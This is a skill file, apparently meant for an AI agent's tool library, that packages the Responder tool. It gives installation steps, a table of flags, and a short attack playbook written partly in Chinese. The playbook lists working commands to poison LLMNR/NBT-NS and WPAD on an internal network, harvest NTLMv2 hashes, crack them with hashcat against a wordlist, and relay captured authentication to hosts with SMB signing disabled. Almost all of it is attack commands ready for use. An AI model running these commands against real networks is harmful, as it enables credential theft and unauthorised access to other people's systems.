---
name: responder-ntlm-poison
description: "Responder: Harvests internal hashes and relays to hosts with SMB signing disabled. Signals: man-in-the-middle, MITM, forced WPAD spoofing, analysis mode, observe only, no poisoning."
zh-signals: "Responder: 内网哈希收割、签名关闭主机中继。信号:中间人,mitm,强制 WPAD 伪造,分析模式(只观察不投毒)。"
---

# Responder

- 攻击大类:C40 嗅探与中间人攻击
- 上游仓库:https://github.com/lgandx/Responder
- 上游 License:GPL-3.0(本 SKILL.md 以 Apache-2.0 二次开源,上游版权归原项目所有)

## 安装

```bash
git clone https://github.com/lgandx/Responder && cd Responder && pip install -r requirements.txt
```

## 参数速查

| 参数 / 命令 | 说明 |
| --- | --- |
| `Responder.py -I eth0` | 启动 LLMNR/NBT-NS/mDNS 毒化 |
| `-wF` | 强制 WPAD 伪造 |
| `-A` | 分析模式(只观察不投毒) |
| `RunFinger.py -i 10.0.0.0/24` | SMB 签名探测(选中继目标) |
| `MultiRelay.py -t <ip> -u ALL` | 将中毒认证中继到指定主机 |
| `-v` | 显示哈希明细 |

## 攻击场景 Playbook

### 内网哈希收割

```bash
sudo python3 Responder.py -I eth0 -wF
# 等待目标解析失败,Responder 应答并收到 NTLMv2 哈希
hashcat -m 5600 responder.db.out /usr/share/wordlists/rockyou.txt
```

### 签名关闭主机中继

```bash
python3 RunFinger.py -i 10.0.0.0/24 | grep -i false
sudo python3 Responder.py -I eth0
# 另一终端: python3 MultiRelay.py -t 10.0.0.7 -u ALL
```

## 注意事项

哈希存于 Responder.db,用 hashcat -m 5600 破解。Server 2012+ 默认开 SMB 签名,优先用 RunFinger 筛目标。
